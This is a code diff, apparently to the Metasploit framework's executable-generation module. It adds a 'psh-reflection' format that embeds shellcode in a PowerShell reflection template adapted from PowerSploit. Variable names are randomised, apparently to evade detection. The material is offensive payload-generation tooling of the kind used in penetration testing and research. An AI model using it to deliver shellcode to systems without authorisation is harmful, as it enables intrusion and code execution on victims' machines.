@@ -865,7 +865,7 @@ require 'digest/sha1'
 		return read_replace_script_template("to_exe.vba.template", hash_sub)
 	end
 
-def self.to_vba(framework,code,opts={})
+	def self.to_vba(framework,code,opts={})
 		hash_sub = {}
 		hash_sub[:var_myByte]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
 		hash_sub[:var_myArray]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
@@ -986,6 +986,26 @@ def self.to_vba(framework,code,opts={})
 		hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
 
 		return read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+	end
+	
+	def self.to_win32pe_psh_reflection(framework, code, opts={})
+		#Added a tweaked by shellster
+		#Originally taken from https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
+		hash_sub = {}
+		hash_sub[:func_get_proc_address] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:func_get_delegate_type] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_code] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_module] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_procedure] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_unsafe_native_methods] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_parameters] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_return_type] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_type_builder] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_buffer] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:var_memset] = Rex::Text.rand_text_alpha(rand(8)+8)
+		hash_sub[:shellcode] = Rex::Text.to_powershell(code, hash_sub[:var_code])
+
+		return read_replace_script_template("to_mem_pshreflection.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
 	end
 
 	def self.to_win32pe_vbs(framework, code, opts={})
@@ -1757,6 +1777,9 @@ def self.to_vba(framework,code,opts={})
 
 		when 'psh-net'
 			output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+			
+		when 'psh-reflection'
+			output = Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
 
 		end
 
@@ -1766,7 +1789,7 @@ def self.to_vba(framework,code,opts={})
 	def self.to_executable_fmt_formats
 		[
 			'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-			'vbs','loop-vbs','asp','aspx','war','psh','psh-net'
+			'vbs','loop-vbs','asp','aspx','war','psh','psh-net', 'psh-reflection'
 		]
 	end
 
